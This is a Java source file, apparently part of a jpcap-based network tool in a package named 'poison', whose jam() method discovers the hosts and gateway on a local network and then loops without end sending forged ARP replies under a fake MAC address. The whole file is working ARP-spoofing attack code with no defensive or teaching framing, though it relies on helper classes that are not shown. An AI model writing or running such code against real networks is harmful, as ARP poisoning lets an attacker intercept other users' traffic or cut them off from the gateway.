package poison;

import java.net.Inet4Address;
import java.net.InetAddress;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;

import jpcap.NetworkInterfaceAddress;
import sniff.Global;
import sniff.MAC;
import jpcap.NetworkInterface;

public class test {
	private static NetworkInterface device;
	private static ArrayList<String> blacklist;

	private sender ARPSender;
	private String fake_mac_str;

	private NetworkInterfaceAddress __get_inet4(NetworkInterface device) throws NullPointerException {
		if (device == null) throw new NullPointerException("No device has been given! ");

		for(NetworkInterfaceAddress addr : device.addresses)
			if(addr.address instanceof Inet4Address)
				return addr;

		return null;
	}

	public test(NetworkInterface mydevice, String fake_mac_str) {
		device = mydevice;
		this.fake_mac_str = fake_mac_str;

		try {
			this.ARPSender = new sender(device);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public void jam() {
		hostdiscover hosty = new hostdiscover(device);
		hosty.discover();
		String gatewayip = hosty.getGatewayIp();
		HashMap<String,String> ip_mac_list = hosty.getHosts();
		
		Thread.currentThread();
		try {
			Thread.sleep(500);
		} catch (InterruptedException e1) {
			e1.printStackTrace();
		}
		
		arp fake = new arp(null);
		byte[] fake_mac = MAC.StringToBytes(fake_mac_str);
		try {
			fake.buildDevice("fak0", "ihniwid", "fak0", "fake", fake_mac,
					gatewayip, this.__get_inet4(device).subnet.toString().split("/")[1]);
		} catch (Exception e) {
			e.printStackTrace();
		}
		long counter = 0;
		while(true){
			try {
				Iterator<String> iter = ip_mac_list.keySet().iterator();

				while(iter.hasNext()) {
					String key = iter.next();// ip address
					String val = ip_mac_list.get(key);//mac address
					counter++;

					System.out.printf("\rNumber of fake arp packets: "+counter);
					
					if(key.equals(gatewayip))
						this.ARPSender.send(fake.build_reply_packet(key, val,
										device.mac_address));	
				 }
				
				Thread.sleep(80);

			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}
	
}